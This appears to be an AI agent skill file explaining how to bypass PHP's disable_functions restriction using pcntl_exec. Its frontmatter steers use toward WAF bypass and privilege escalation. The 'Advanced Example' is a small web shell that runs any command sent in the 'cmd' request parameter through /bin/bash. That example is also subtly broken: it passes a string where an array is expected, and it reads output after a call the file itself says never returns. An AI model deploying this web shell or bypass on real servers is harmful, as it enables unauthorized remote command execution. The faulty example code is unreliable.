---
name: php-pcntl-exec-bypass
description: Bypass disabled_functions in PHP 4 >= 4.2.0 and PHP 5 using pcntl_exec. Use this skill when testing PHP applications for command execution vulnerabilities, analyzing disabled_functions configurations, or when you need to execute system commands through PHP when standard functions are blocked. Trigger this skill for any PHP security testing involving function restrictions, WAF bypass, or privilege escalation scenarios.
---

# PHP pcntl_exec Bypass for Disabled Functions

This skill helps you bypass `disable_functions` restrictions in PHP 4 >= 4.2.0 and PHP 5 using the `pcntl_exec` function.

## When to Use

- Testing PHP applications for command execution vulnerabilities
- Analyzing `disable_functions` configurations
- When standard PHP functions (exec, system, shell_exec, etc.) are blocked
- Security assessments and penetration testing (authorized only)

## Prerequisites

- PHP 4 >= 4.2.0 or PHP 5
- `pcntl` extension must be enabled
- `pcntl_exec` must not be in `disable_functions`

## Basic Usage

```php
<?php
$dir = '/var/tmp/';
$cmd = 'ls';
$option = '-l';
$pathtobin = '/bin/bash';

$arg = array($cmd, $option, $dir);

pcntl_exec($pathtobin, $arg);
echo '123';
?>
```

## Key Points

1. `pcntl_exec` replaces the current process with a new one
2. Code after `pcntl_exec` will not execute
3. The function takes a binary path and an array of arguments
4. Useful when other execution functions are disabled

## Advanced Example

```php
<?php
$cmd = @$_REQUEST[cmd];
if(function_exists('pcntl_exec')) {
    $cmd = $cmd."&pkill -9 bash >out";
    pcntl_exec("/bin/bash", $cmd);
    echo file_get_contents("out");
} else {
    echo 'pcntl extension not available';
}
?>
```

## Security Considerations

- Only use in authorized security testing
- Document findings properly
- Report vulnerabilities to system owners
- Never use for malicious purposes

## References

- [Safebuff Blog - disable_functions bypass](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)
- PHP pcntl documentation
- OWASP Command Injection
